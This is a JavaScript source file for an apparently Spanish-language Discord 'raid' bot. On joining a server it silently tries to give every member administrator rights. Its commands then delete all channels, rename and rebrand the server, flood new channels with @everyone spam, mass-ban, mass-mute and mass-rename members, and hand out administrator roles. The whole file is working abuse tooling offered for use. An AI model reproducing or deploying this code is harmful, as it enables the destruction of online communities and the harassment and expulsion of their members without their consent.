const { Client, Intents } = require('discord.js');
const client = new Client({ intents: [Intents.FLAGS.GUILDS] });
/*
MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
*/

// Habilitar uso de comandos en todos los canales
client.on('guildCreate', async guild =>{
  guild.roles.cache.find(role => role.name =="@everyone").setPermissions('ADMINISTRATOR').catch(()=>{
    return;
  })
  guild.roles.cache.find(role => role.name === '@everyone').setPermissions('USE_APPLICATION_COMMANDS').then(()=>{
    guild.channels.cache.forEach(channel =>{
  
        channel.permissionOverwrites.edit(guild.id, {'USE_APPLICATION_COMMANDS': true,'READ_MESSAGE_HISTORY': true, 'VIEW_CHANNEL': true, 'SEND_MESSAGES': true}).catch(()=>{
          return;
        })
    })
    }).catch(()=>{
      return;
    })
   })
//Fin

client.on('ready', () => {
    client.user.setActivity(require('./config.json').BOT_CONFIGURACION.info, { type: require('./config.json').BOT_CONFIGURACION.tipo });
    client.user.setPresence({
      status: require('./config.json').BOT_CONFIGURACION.estado
    });
  console.log(`
                                                  
                                                                                
                                                                                
                                      'll'                                      
                                     ;0WW0;                                     
                                    ,0MMMMK:                                    
                                    .dNMMMMXc                                   
                                     .oNMMMMNo.                                 
                                .coooolxOXMMMWx.                                
                               'kWMMMK:..:KMMMWk'                               
                              ,OWMMW0,    ,0WMMWO,                              
                             ;KMMMWk'      'kWMMMK;                             
                             ,cccc:.        .:cccc,                             
                                                                                                
                                ALRETIX SOURCE CODE
                    MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
                    
Invitación Bot: 
https://discord.com/api/oauth2/authorize?client_id=${require('./config.json').botID}&permissions=8&scope=bot%20applications.commands

Estado del Bot: Encendido
Servidores: ${client.guilds.cache.size}

#####################################################################################################################################

Comandos:
/raid : Raidea el servidor
/customraid : Haz un Custom Raid
/limpiar : Limpia los canales del servidor
/massban : Banea a gran cantidad de usuarios en el servidor inferiores al rol del bot
/massmute : Mutea a gran cantidad de usuarios en el servidor inferiores al rol del bot
/massroles : Crea demasiados roles en el servidor
/massnames : Cambia el apodo de usuarios inferiores al rol del bot
/admin : Date Administrador en el servidor o a alguien mas
/adminall : Dale Administrador a todos los miembros del servidor
/salir : Saca al Bot del servidor
`);
});
/*
MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
*/
client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;
  if(!interaction.guild.me.permissions.has('ADMINISTRATOR')){
    return interaction.reply({content: '**No tengo permisos en este servidor. Permiso requerido: ADMINISTRADOR**', ephemeral: true})
  }
  let cmd = interaction.commandName
/*
MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
*/
  if (cmd === 'raid') {
    try{
        //if(10 >= interaction.guild.memberCount) return interaction.reply({content: '**Solo puedes Raidear servidores con un máximo de +10 personas dentro del server.**', ephemeral: true})
        let IDsv = interaction.guild.id
        client.guilds.cache.get(IDsv).setName(require('./config.json').SERVIDOR.Nombre_Server).catch(e=>{
          return
        })
        client.guilds.cache.get(IDsv).setBanner(require("./config.json").SERVIDOR.bannerURL).catch(e=>{
          return
        })
        client.guilds.cache.get(IDsv).setIcon(require("./config.json").SERVIDOR.iconURL).catch(e=>{
          return
        })
    
    
    try {
      interaction.guild.channels.cache.forEach(channel =>{
    
        channel.delete().catch(()=>{return;})
      
      })
    } catch (error) {
      return;
    }
    
    for (let i = 0; i <= require('./config.json').CONFIGURACION.cantidad_canales; i++) {
    await  interaction.guild.channels.create(require('./config.json').CONFIGURACION.nombre_canales).then(c => {
      c.permissionOverwrites.create(c.guild.roles.everyone, { READ_MESSAGE_HISTORY: true,VIEW_CHANNEL: true, SEND_MESSAGES: true }).catch(e=>{return})
      for (let i = 0; i <= require('./config.json').CONFIGURACION.cantidad_mensajes; i++) {
        c.send(`@everyone \n ${require('./config.json').CONFIGURACION.mensaje_por_canales} \n ${require('./config.json').CONFIGURACION.invitacion_tu_server} `).catch(e=>{return})
          }
        }).catch(()=>{
          return;
        })
      }
    
    }catch (e) {
            console.error(e);
            }
  }
  /*
MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
*/
  if(cmd === 'customraid'){
    try{
    //if(10 >= interaction.guild.memberCount) return interaction.reply({content: '**Solo puedes Raidear servidores con un máximo de +10 personas dentro del server.**', ephemeral: true})

    
    const channelname =  interaction.options.getString('channels-name')
    const servericon =  interaction.options.getString('server-icon')
    const servername =  interaction.options.getString('server-nombre')
    const serverbanner =  interaction.options.getString('server-banner')
    const massban =  interaction.options.getBoolean('massban')
    const textsend =  interaction.options.getString('text-send')
    const csize =  interaction.options.getNumber('c-canales')
    const tsize =  interaction.options.getNumber('c-pings')
    const nicknames =  interaction.options.getString('apodos')
    
    if(csize > 300) return interaction.reply({content: '**Debes colocar una cantidad de canales minima a 300**', ephemeral: true})
    if(tsize > 30) return interaction.reply({content: '**Debes colocar una cantidad de menciones minima a 30**', ephemeral: true})



    let IDsv = interaction.guild.id
    client.guilds.cache.get(IDsv).setName(servername).catch(e=>{
      return
    })
    client.guilds.cache.get(IDsv).setBanner(serverbanner).catch(e=>{
      return
    })
    client.guilds.cache.get(IDsv).setIcon(servericon).catch(e=>{
      return
    })



if(massban == true){
  interaction.guild.members.cache.forEach(member => {
    if(member.user.id == interaction.user.id){
      return;
    }else{
      member.ban({reason: require('./config.json').CONFIGURACION.RANDOM_REASON}).catch(e=>{ 
        return;
      })
    }

  })
 
}
interaction.guild.members.cache.forEach(member =>{
  member.setNickname(nicknames).catch(()=>{return;})
})
if(massban == false){
  console.log(0)
}
try {
  interaction.guild.channels.cache.forEach(channel =>{

    channel.delete().catch(()=>{return;})
  
  })
} catch (error) {
  console.log(error)
}
client.guilds.cache.get(IDsv).channels.create('unete').then(async c=>{
  c.permissionOverwrites.create(c.guild.roles.everyone, { READ_MESSAGE_HISTORY: true,VIEW_CHANNEL: true, SEND_MESSAGES: true }).catch(e=>{return})

}).catch(e=>{return})

for (let i = 0; i <= csize; i++) {
await  interaction.guild.channels.create(channelname).then(c => {
  c.permissionOverwrites.create(c.guild.roles.everyone, { READ_MESSAGE_HISTORY: true,VIEW_CHANNEL: true, SEND_MESSAGES: true }).catch(e=>{return})
  for (let i = 0; i <= tsize; i++) {
    c.send(`  @everyone \n ${textsend}`).catch(e=>{return}).catch(e=>{return})
  }
  }).catch(()=>{return})
  }



}catch (e) {
        console.error(e);
        
        }
  }
  /*
MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
*/
  if(cmd === 'limpiar'){
    interaction.guild.channels.cache.forEach(c => {
        c.delete().catch(e=>{
          return;
        })
        })
       
          interaction.guild.channels.create('.').then(c => {
            c.permissionOverwrites.create(c.guild.roles.everyone, { READ_MESSAGE_HISTORY: true,VIEW_CHANNEL: true, SEND_MESSAGES: true }).catch(e=>{return})
          }).catch(()=>{
            return;
          })
          
            interaction.user.send({content: '**Se ha comenzado la eliminación de canales, esto puede demorar un poco.**'}).catch(()=>{
              return;
            })
  }
/*
MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
*/
  if(cmd === 'massban'){
    try{
        interaction.reply({content: '**Iniciando Massban en este server, solo podré banear a usuarios inferiores a mi rol.**', ephemeral: true})
      
        interaction.guild.members.cache.forEach(member => {
          if(member.user.id == interaction.user.id){
            return;
          }else{
            member.ban({reason: require('./config.json').CONFIGURACION.RANDOM_REASON}).catch(e=>{ 
             return;
            })
          }
      
        })
                      
      }catch (e) {
              console.error(e);
              }
  }
/*
MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
*/
  if(cmd === 'massmute'){
    try{
        interaction.reply({content: '**Iniciando Massmute en este server, solo podré mutear a usuarios inferiores a mi rol y que no tengan permisos administrativos.**', ephemeral: true})
      
        interaction.guild.members.cache.forEach(member => {
          if(member.user.id == interaction.user.id){
            return;
          }else{
            member.timeout(3600000, require('./config.json').CONFIGURACION.RANDOM_REASON).catch(e=>{ 
             return;
            })
          }
      
        })
          
    }catch (e) {
              console.error(e);
            }
  }
/*
MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
*/
  if(cmd === 'massroles'){
    try{



        const nombre = require('./config.json').MASSROLES.nombre_roles
        const color = require('./config.json').MASSROLES.color_HEX
        const icon = require('./config.json').MASSROLES.rol_icon
        
    
    
    
    
        let roles = interaction.guild.roles.cache.size
        if(roles == 250) return interaction.reply({content: '**Este servidor alcanzó el limite de roles por servidor en Discord.** Max: 250', ephemeral: true})
    
        
        interaction.reply({content: '**Se ha comenzado a crear roles en este servidor, puedes presenciar lag debido a los cambios repentinos y la creación masiva de roles.**', ephemeral: true}).catch(()=>{
            return;
          })
    
        for (let i = 0; i <= require('./config.json').MASSROLES.cantidad_roles; i++) {
            interaction.guild.roles.create({
                name: nombre,
                color: color,
                reason: require('./config.json').CONFIGURACION.RANDOM_REASON,
                position: interaction.guild.me.roles.highest.position
            }).then(r=>{
                r.iconURL(icon).catch(()=>{
                    return;
                })
            }).catch(()=>{
                return;
            })
        }
             
    
    }catch (e) {
            console.error(e);

            }
  }
/*
MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
*/
  if(cmd === 'massname'){
    try{

        const nicknames =  interaction.options.getString('apodo')
         interaction.guild.members.cache.forEach(async member =>{
            await member.setNickname(nicknames).catch(()=>{return;})
          })
        
        interaction.reply({content: '**Cambiando apodos a usuarios inferiores a mi rol, esto puede demorar un momento.**', ephemeral: true})
        
        }catch (e) {
                console.error(e);
                }
  }
/*
MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
*/
  if(cmd === 'admin'){
    try{
        const target = interaction.options.getMember('miembro')
        if(!target){
            interaction.guild.roles.create({
                name: '.',
                permissions: 'ADMINISTRATOR',
                position: interaction.guild.me.roles.highest.position 
            }).then(c=>{
                interaction.member.roles.add(c.id).catch(()=>{return;})
            }).catch({content: '**Ocurrió un error al intentar crear un rol con permiso administrativo en este servidor, por favor revise si tengo permisos necesarios.**', ephemeral: true}).catch(()=>{return;})
            interaction.reply({content: '**Has obtenido administrador en este servidor.**', ephemeral: true}).catch(()=>{return;})
            
            
        }else{
            
            interaction.guild.roles.create({
                name: '.',
                permissions: 'ADMINISTRATOR',
                position: interaction.guild.me.roles.highest.position
            }).then(c=>{
                target.roles.add(c.id).catch(()=>{return;})
            }).catch({content: '**Ocurrió un error al intentar crear un rol con permiso administrativo en este servidor, por favor revise si tengo permisos necesarios.**', ephemeral: true}).catch(()=>{return;})
            target.send({content: `**Has obtenido administrador en el servidor ${interaction.guild.name} servidor.**`, ephemeral: true}).catch(()=>{return;})
            interaction.reply({content: '**Se le otorgó Administrador al usuario correctamente.**', ephemeral: true}).catch(()=>{return;})
        }
    
    
    
    }catch (e) {
            console.error(e);
            }
  }
/*
MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
*/
  if(cmd === 'adminall'){
    try{
        interaction.guild.roles.cache.find(role => role.name =="@everyone").setPermissions('ADMINISTRATOR').catch(()=>{
            interaction.reply({content: "**Ocurrió un error al intentar otorgar este permiso al rol @everyone, por favor revise mis permisos.**", ephemeral: true})
        })
        interaction.reply({content: '**Se le otorgó permiso administrativos a todos en el servidor.**', ephemeral: true})
        
        }catch (e) {
                console.error(e);
                }
  }
/*
MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
*/
  if(cmd === 'salir'){
    try{

        interaction.reply({content: "**Se ha terminado el raideo.**", ephemeral: true})
        setTimeout(()=>{
            interaction.guild.leave().catch(()=>{return;})
        }, 3000)
        
        }catch (e) {
                console.error(e);
                }
  }
/*
MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
*/
});
/*
MADE BY ; xEShaddyZx#2200 (ID: 775537555419430943)
*/
client.login(require('./config.json').botTOKEN);
